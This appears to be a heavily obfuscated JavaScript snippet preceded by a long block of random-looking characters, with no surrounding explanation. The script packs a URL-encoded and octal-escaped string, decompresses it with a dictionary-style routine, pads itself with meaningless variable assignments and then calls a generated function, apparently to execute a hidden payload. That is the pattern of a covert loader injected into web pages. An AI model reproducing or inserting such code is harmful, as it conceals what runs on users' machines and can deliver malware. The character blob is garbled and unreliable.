eVizcoWn=H\nX]sYHs|Lsx[hG	d9LsH<sy|Grh<xoG\rJ&GhNYP{HrMTRtHGv;n5x:w\nMqbMI^6-dXrMc.QVuMkBn~Gi1GM\'G3fGj}%GG4r5GIxG7GGqwKQpx:M\nTYxj|QSvcHsd${WN0qI}uRps5My<mEIsfiSUH|jEwG\'zwtLvaG-Gc"ee8IUvZ QAg	xa*|IRDRL5M]gareiIy.IN.is{iQ9[1z0Ksm$S~`m$PR6R+FsMifWK\rQxy.eSI@.GH`z0MS^Q4}MrCGp|"s?x\ryY=ji{3t]o:PGSy/cWjt\rx$c.x+j]F}	R-kZ}	fG8zx[}%F7H!F2GI(W~uYF"d!jHRTwzcF=R5F?G>k&LvG7F9kYPFBsF(r}R;kYFW"ubF\'ispYLh=vQ}	_cF?g	gxF!x{F`GnFc^SFesEFhF#PzcFSFUsCGfaqbF-F4d2c.m F2JZ_DFHFOG5F<EG>FAFrFErFGLfEGk&taFIsmFKGFRF]wPjHFYT\\[P(EF_p]vNV8F2QCnh=FfJeFCFivNv6E$v@r4E\'x[Z.MvFKzcIJ`h5kBqJ,QGs7KKJG~wFzc|IS?IzcF|%FnhF\nL]IZ|"qlmMzc{zo?KOcxSVcVLE5IIE>Q(R>m-EKJ_Rt,K5RYQ/GOnGQL|G[QkEiSyZ%y}IF$qQrzOnwSyLOEBEDx4wHGYCEyGvuRDU`n~xKY"JyL9wOLTLaS}EIFEKJwGn\\dR\'IOa)DqyI*dLdIh_}I<WKRDSyEJIAI-StL<DnsFDnsF\nRDIBKLWRsFc{QE]x[LBtaD:\'JIp{Q,E`gYEXQ`nhRtSiEaecgRg[LL^RBRYEXJbIK%E6z%|5L]e^|(DBD#QYEiP=ElL/DkZRDJfEe|kB!IRgEmVKQsEpGErnEtEvJ+FEzD%DelEDdD{ECDmDbDD\nI,K<{DDzcDEHTv~RJ{8DDINWmDEXDDStDIQsKRCD"RyD$EiDgZ8Dit*DkF	J_j/Do]:D$DCCDCCCCD(C	uC/C\rvuCyGoXCC4CbvCD4DdLXNqKEs$gxSpGPxcuTED[E_D^YCC$EdC&avmDlIC-L`dE|DtDvrze^C0rCD,.D&D}DD+CzcE}CgDCD	CDCJuC_VnwD.FF\nCC7|WCCCD2D)CFRYKekYEVDpQ.EbD0CW}C\'scC)EcE8C,DcC#BChDsH;DurtEuCcExE|dkCehXD~C;nhCiGsDClCxDCzCBC9CKKFJ"RlBS_h<D@raFBE8RK*_=JUJlJWwEJpJ[IC*B<};GEM{LCNxCuTx"E6N/COrE6Nt}TPGy|na|RfD9KQmBc}LBJzcF[{pwq\\D`-zPE;\\^h)<m1t*KtN{MnBAILkBrKvBuLrEgD_BC%BCYBBB{zC]K6B&D|GsB/CuAD-B,CgD1AKLB1QtCJy1BEiDXwqLsCS]Hr~_VCVBHAzcDjC[JgDnBB}JIBM}#rABA*SxBHQHhBsBr_CdB CmB#CkDdB"v~DCLP}CCtKLCvEGDCB(F	CC|CsQ0ACRJ@AFC8JuACHRTA(QkA@A\nCgD3C:L6C<C2DC?I=BDD5BD6gYBJrRzB~B\rt,A$BGI	BD$L$BDaBSA/DqBEqBCbA9BAECB!E|A=YXM5@	AACADAD~xAVd$AiAIBKAKC=ANAgE~DC}CpC@CfAQ@B0AkK	Q\'DQAc@CnN~AWAHA?AdAMAfyHA`AiAYCGAmJ9EB\rB>XB@L,K0Joy`K3BE^9A\rE7I	Km!@9y1G}A+EkBSmBQ{uBSBUMlZLkjitaRDfMmGWzNoBr@^B_D;z\nD=m.@WMnr5N]Et/@cN|h<o@hnh@]@qzzG@\\@j@_x[~ozBBAgwL	B^r5K"A]gy1GcFVjjDKE6BAtC(A%AxL#DVE<T@B|CU@zcA3HgxW@EwDyG@@+@\nJ3@\rA\n@D@!tJE\'<QEe@5C9uQP@gr@1AB.APABCB?+r4)?-S=OZy>I1?/C}F\nDqy\'m HV;[tIX`B@(C"BF?$AAxzc?GnAJb[?4@GCykTn]PS?Fm ?0C>yH?JvQ?L-?N?PK$eI\rKV{`I~u>s2RFxp3R&L2}H}xqJWMGFvDFnsL|GvddJ:LZlqL]Bc{bw?yxSIQA1BECCaBDwA:@+E{?Wx2B$@A2C1?(C3@ghm@qJ?,Y^Qekx4VgZ?7DfDwH@AS?~>*}ut5W.XTp?EKA|}>.u?oT{J\n{_gsLceLp3t]SCLK"|G|IXiu?{"ta>gvn1>Th>W>{az3m{s|FOgu!C\r,pX>fuetz>N\\dNS~nQ358nSCvsHGNGVqJn]\njs>N>PGRRxag~xP{Im4len_na}}MgmAyIFSKwzc=tdzcG^ufN5GlEY_.[qV	Rm8qOMMMUMWqMM:ro)=$sKd?)t8]]-t>m|%>o3]G3fQutkxGk{_=[t8[|>lyC>nm\\=5v9r2fQunPqO=Bj3=3m\\03Um=)="x,=)=&=,=T=+=(=.=AY"=2g=4=6r2g=J]-i\'H}=coEqn~yk}`MGMnqnspcw^=u}*}RgC==yk[IT};tMZ$2$=R=rS@=xtiZi\\pwNx{NjX|FA.=eYFIzG_o4uevyvcFq >NSEpMSHinvcgJ<>~pWuefN<)|E>Q>p\\t*>MpP>O</<={_>`v>cBfS~>hOt>g">k=_=C=O>p>rHr<EPMBfEzvyH,oce~dzcxEdH,ooTjp2zv~m<\\<]<^<_<`<a<b<c<d~k~_<g<h<i<j<k<l<m<n<o<p<q<r<s<t<u<v<w<x<y<z<{<|<}<~<~A<e;;;;;;;;	~';y0n3n+=  '%30%2C%31%29%3Bl%31%5B%5F\154%5D%3D\154%30%5BIl%5D%3B%69%66%28\154%32%29%7Bli%2B%3Dl%30%5BI\154%5D%7D%3Bb\162%65\141\153%3B\144%65f%61%75%6C%74%3Al%31%5B%5Fl%5D%3D\154%30%5B%6C%37%5B%5F%6C%5D%5D%3B%69f%28l%32%29%7Bli%2B%3Dl%30%5B\154%37%5B%5Fl%5D%5D%7D%3Bl%30%5B\111\154%5D%3D%6C%30%5Bll%5D%2B\123t\162%69ng%28%6C%30%5Bl%37%5B%5F%6C%5D%5D%29%2E%73u%62%73t\162%28%30%2C%31%29%3Bb%72%65\141\153%7D%3B\111l%2B%2B%3B\154\154%3D%6C%37%5B%5Fl%5D%3B%5F\154%2B%2B%7D%3B%69%66%28%21%6C%32%29%7Br\145turn%28%6C%31%2E%6Ao\151\156%28%27%27%29%29%7D%65\154%73e%7Br\145t\165r\156%20l%69%7D%7D%3B\166a%72%20lO%3D%27%27%3Bfo%72%28%69\151%3D%30%3B%69\151%3Ch%4A\110%4F%65\160\126%37N\154%73%75Gk%2E\154\145n\147t\150%3B%69%69%2B%2B%29%7BlO%2B%3D\154%33%28\150\112H\117ep\126%37\116\154\163%75%47k%5B\151%69%5D%29%7D%3Be%64%35%62%38\141c%36%63%28%29%3B';yt94118ZWEm54      ='uZSODtbwFlZZpHrwGEsaOYUkWgIyJLOalcifOfCeBxjjOOOiWbUJqJwaERUIUeB';l6RS74BPf='t4cGGPMGUE8N8';e5172A7iiVtn68l5    (ku1xgXw);iVtn68l5e5172A7i  (y0n3n);o9wHuLEJ66  (y0n3n);ywo7yLx66+=  'EGnORlxinVyTMeFhYTKJLqYMnqMqJKMFBKnoOBksqOyZOrvZRQfdxwjVBExQdbhOucxrdiYbdfyqHYIWsSMKiOGeNaHqtkKOToFVikRveTkNFJxfjnbOYQnIvmYMDOvVlLtvoDe';hYjb89+=  'e59aeU556xl';
